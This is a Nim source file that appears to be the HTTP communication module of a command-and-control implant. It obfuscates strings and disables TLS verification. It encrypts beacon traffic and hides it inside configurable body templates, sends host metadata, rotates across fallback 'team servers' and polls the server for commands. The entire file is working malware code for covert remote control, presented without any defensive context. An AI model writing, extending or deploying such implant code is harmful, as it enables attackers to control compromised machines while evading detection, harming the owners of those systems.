import std/json as jsonmod
import std/strutils
from ../libs/std_http import HttpClient, newHttpClient, newHttpHeaders, post, code, body, close
import std/tables
from std/net import newContext, CVerifyNone
import ../global
import ../general/strings
import ../general/metadata
import ../crypt/transport
import ../tasks/buffer
import ../tasks/tasks as tdb

type HttpResponse* = object
  ok*: bool
  code*: uint16
  body*: string

const contentMarker* = obf("§content§")

proc bodyTemplate(): string =
  # Returns the body template or the content marker when none is set
  if customCommunication != contentMarker:
    return customCommunication
  for key, value in tables.pairs(bodyContent):
    if key == obf("template"):
      return value
  contentMarker

proc extractFromTemplate*(raw, tpl: string): string =
  # Pulls the marked content out of the raw text using the template
  let tpl = tpl.strip()
  if tpl.len == 0 or tpl == contentMarker:
    return raw
  let parts = tpl.split(contentMarker)
  if parts.len < 2:
    return ""
  var pos = 0
  for i in 0 ..< parts.len - 1:
    let prefix = parts[i]
    let suffix = parts[i + 1]
    if prefix.len > 0:
      let p = raw.find(prefix, pos)
      if p < 0:
        return ""
      pos = p + prefix.len
    var endPos = raw.len
    if suffix.len > 0:
      let s = raw.find(suffix, pos)
      if s < 0:
        return ""
      endPos = s
    if i == parts.len - 2:
      return raw[pos ..< endPos]
    pos = endPos + suffix.len
  return ""

proc extractResponsePayload*(raw: sink string): string =
  # Extracts the payload from the server response using the template
  if customCommunication == contentMarker:
    return raw
  extractFromTemplate(raw, serverResponseTemplate)

proc applyClientMeta(client: HttpClient): bool =
  # Applies custom headers and cookies on the HTTP client
  var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
  var hasMeta = false
  for key, value in tables.pairs(customHeaders):
    hasMeta = true
    pairs.add((key, value))
  var cookies: seq[string] = @[]
  for key, value in tables.pairs(customCookies):
    cookies.add key & obf("=") & value
  if cookies.len > 0:
    hasMeta = true
    pairs.add((obf("Cookie"), cookies.join(obf("; "))))
  client.headers = newHttpHeaders(pairs)
  hasMeta

proc buildWirePayload(plain: string): string =
  # Encrypts the plain text and wraps it in the body template
  let encrypted = cryptEncryptWithProbe(aesKey, plain)
  if encrypted.len <= AesProbeWireLen:
    return ""
  let tpl = bodyTemplate()
  if tpl == contentMarker:
    return encrypted
  tpl.replace(contentMarker, encrypted)

proc baseUrl(): string =
  # Builds the base URL from the channel, host, port, and path
  let sep = obf(",")
  let h = host.split(sep)[0]
  let pt = port.split(sep)[0]
  if parsePortDigits(pt) == 0:
    return ""
  let scheme = if channel == obf("https"): obf("https://") else: obf("http://")
  scheme & h & obf(":") & pt & path.split(sep)[0]

proc exchangeUrl(url: string; payload: string): HttpResponse =
  # Posts the payload to the URL and returns the decrypted response
  if url.len == 0:
    return HttpResponse()
  var client: HttpClient
  if url.startsWith(obf("https://")):
    client = newHttpClient(userAgent = "", sslContext = newContext(verifyMode = CVerifyNone))
  else:
    client = newHttpClient(userAgent = "")
  defer:
    close(client)
  client.headers = newHttpHeaders({obf("Connection"): obf("close")})
  try:
    var wire = payload
    if payload.len > 0:
      wire = buildWirePayload(payload)
      if wire.len == 0:
        return HttpResponse()
      let hasMeta = applyClientMeta(client)
      if not hasMeta:
        client.headers = newHttpHeaders({
          obf("Connection"): obf("close"),
          (obf("Content-Type")): obf("application/octet-stream"),
        })
    let resp = post(client, url, wire)
    let status = uint16(code(resp))
    var responseBody = body(resp)
    let (_, rawOk) = calculateBufferSize(responseBody.len, tdb.TaskRecord())
    if not rawOk:
      responseBody.setLen(0)
      return HttpResponse()
    responseBody = extractResponsePayload(move(responseBody))
    responseBody = tryCryptDecrypt(aesKey, move(responseBody))
    let (_, decOk) = calculateBufferSize(responseBody.len, tdb.TaskRecord())
    if not decOk:
      responseBody.setLen(0)
      return HttpResponse()
    HttpResponse(
      ok: true,
      code: status,
      body: responseBody,
    )
  except CatchableError:
    HttpResponse()

proc exchange(payload: string): HttpResponse =
  # Sends the payload to the base URL, rotating team servers when one is unreachable
  result = exchangeUrl(baseUrl(), payload)
  if result.ok:
    return
  let sep = obf(",")
  let hs = host.split(sep)
  let ps = port.split(sep)
  let xs = path.split(sep)
  if hs.len > 1 and hs.len == ps.len and hs.len == xs.len:
    host = join(hs[1 ..^ 1], sep) & sep & hs[0]
    port = join(ps[1 ..^ 1], sep) & sep & ps[0]
    path = join(xs[1 ..^ 1], sep) & sep & xs[0]

proc httpPost*(body: string): HttpResponse =
  # Posts the body through the HTTP exchange
  exchange(body)

proc relay_call*(payload: string): HttpResponse =
  # Relays the payload with an HTTP post
  httpPost(payload)

proc sendRequest*(tag: string): HttpResponse =
  # Builds an input request with metadata and sends it
  var payload = %*{(obf("option")): obf("input"), (obf("host")): tag}
  payload[obf("metadata")] = createMetadata()
  let wire = $(payload)
  exchange(wire)

proc sendBatch*(payload: string): HttpResponse =
  # Attaches metadata to each batch item and sends the batch
  if payload.len <= 2 or payload == obf("[]"):
    return HttpResponse()
  try:
    let batch = jsonmod.parseJson(payload)
    if batch.kind == jsonmod.JArray:
      let meta = createMetadata()
      for item in batch:
        if item.kind == jsonmod.JObject:
          item[obf("metadata")] = meta
      let batchWire = $(batch)
      return exchange(batchWire)
  except jsonmod.JsonParsingError:
    discard
  exchange(payload)

proc hasCommands*(resp: HttpResponse): bool =
  # Checks that the response body contains at least one command
  if not resp.ok or resp.body.len == 0:
    return false
  try:
    let data = jsonmod.parseJson(resp.body)
    if data.kind != jsonmod.JObject or not data.hasKey(obf("commands")):
      return false
    for _ in data[obf("commands")]:
      return true
    false
  except jsonmod.JsonParsingError:
    false
